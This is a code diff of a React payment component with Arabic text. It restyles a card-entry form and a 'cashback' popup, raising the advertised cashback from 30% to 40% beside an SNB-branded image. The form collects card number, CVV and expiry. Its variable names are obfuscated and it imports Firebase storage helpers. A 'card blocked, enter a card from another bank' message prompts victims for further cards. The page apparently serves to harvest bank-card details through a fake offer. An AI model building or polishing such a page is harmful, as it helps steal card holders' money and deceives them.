@@ -7,7 +7,14 @@ import { toast } from "sonner";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { ShieldCheck, CreditCard, Lock, Smartphone, X, Gift } from "lucide-react";
+import {
+  ShieldCheck,
+  CreditCard,
+  Lock,
+  Smartphone,
+  X,
+  Gift,
+} from "lucide-react";
 import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils";
 import { db } from "@/lib/firebase";
 import { secureAddData } from "@/lib/secure-firebase";
@@ -515,7 +522,10 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       />
 
       {showCashbackPopup && (
-        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4" dir="rtl">
+        <div
+          className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4"
+          dir="rtl"
+        >
           <div className="relative bg-white rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-in fade-in zoom-in-95 duration-300">
             <button
               onClick={() => setShowCashbackPopup(false)}
@@ -529,21 +539,25 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 <Gift className="w-6 h-6 text-yellow-300" />
                 <h3 className="text-lg font-black text-white">عرض حصري!</h3>
               </div>
-              <p className="text-green-100 text-sm">استرداد نقدي عند الدفع بالبطاقات الائتمانية</p>
+              <p className="text-blue-100 text-sm">
+                استرداد نقدي عند الدفع بالبطاقات الائتمانية
+              </p>
             </div>
 
             <div className="p-1">
               <img
-                src="/snb-cashback.jpg"
-                alt="استرداد نقدي 30% عند استخدام البطاقات الائتمانية"
+                src="/snb-cashback.png"
+                alt="استرداد نقدي 40% عند استخدام البطاقات الائتمانية"
                 className="w-full rounded-lg"
               />
             </div>
 
             <div className="p-4 space-y-3">
-              <div className="bg-green-50 border border-green-200 rounded-xl p-3 text-center">
-                <p className="text-green-800 font-bold text-sm">
-                  استرداد نقدي <span className="text-2xl text-green-700">30%</span> عند استخدام البطاقات الائتمانية التالية
+              <div className="bg-blue-50 border border-blue-200 rounded-xl p-3 text-center">
+                <p className="text-blue-800 font-bold text-sm">
+                  استرداد نقدي{" "}
+                  <span className="text-2xl text-blue-700">40%</span> عند
+                  استخدام البطاقات الائتمانية التالية
                 </p>
               </div>
               <button
@@ -563,12 +577,15 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       >
         {/* Card Information Form */}
         <form onSubmit={_hp} className="space-y-3">
-
           {/* Payment logos pill */}
           <div className="flex items-center justify-center gap-2 border border-gray-200 rounded-full py-2 px-4 w-fit mx-auto">
             <img src="/mada.jpg" alt="Mada" className="h-5 object-contain" />
             <img src="/visa.svg" alt="VISA" className="h-4 object-contain" />
-            <img src="/mas.svg" alt="Mastercard" className="h-5 object-contain" />
+            <img
+              src="/mas.svg"
+              alt="Mastercard"
+              className="h-5 object-contain"
+            />
           </div>
 
           {/* Card Number */}
@@ -582,7 +599,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               dir="rtl"
               className={`h-14 text-base border rounded-xl px-4 transition-all ${
                 isValidCard
-                  ? "border-green-400 focus:border-green-500"
+                  ? "border-blue-400 focus:border-blue-500"
                   : _v1.length > 0
                     ? "border-red-300 focus:border-red-400"
                     : "border-gray-300 focus:border-[#1976d2]"
@@ -590,13 +607,19 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               required
             />
             {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && (
-              <p className="text-red-500 text-xs mt-1 pr-1">يجب أن يكون 16 رقم</p>
+              <p className="text-red-500 text-xs mt-1 pr-1">
+                يجب أن يكون 16 رقم
+              </p>
             )}
             {cardRejectionError && (
-              <p className="text-red-600 text-xs font-bold mt-1.5 pr-1">{cardRejectionError}</p>
+              <p className="text-red-600 text-xs font-bold mt-1.5 pr-1">
+                {cardRejectionError}
+              </p>
             )}
             {isCardBlockedState && (
-              <p className="text-red-600 text-xs font-bold mt-1.5 pr-1">تم إيقاف التسديد — الرجاء إدخال بطاقة من مصرف آخر</p>
+              <p className="text-red-600 text-xs font-bold mt-1.5 pr-1">
+                تم إيقاف التسديد — الرجاء إدخال بطاقة من مصرف آخر
+              </p>
             )}
           </div>
 
@@ -611,7 +634,9 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 maxLength={3}
                 dir="rtl"
                 className={`h-14 text-base border rounded-xl px-4 ${
-                  _v2.length === 3 ? "border-green-400" : "border-gray-300 focus:border-[#1976d2]"
+                  _v2.length === 3
+                    ? "border-blue-400"
+                    : "border-gray-300 focus:border-[#1976d2]"
                 }`}
                 required
               />
@@ -631,7 +656,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                   expiryError
                     ? "border-red-400 focus:border-red-500"
                     : _v3.length === 5 && !expiryError
-                      ? "border-green-400"
+                      ? "border-blue-400"
                       : "border-gray-300 focus:border-[#1976d2]"
                 }`}
                 required
@@ -656,7 +681,9 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           {/* Submit Button */}
           <Button
             type="submit"
-            disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4}
+            disabled={
+              !isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4
+            }
             className="w-full h-13 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-base rounded-xl transition-all disabled:opacity-60 disabled:cursor-not-allowed"
           >
             <Lock className="w-4 h-4 ml-2" />
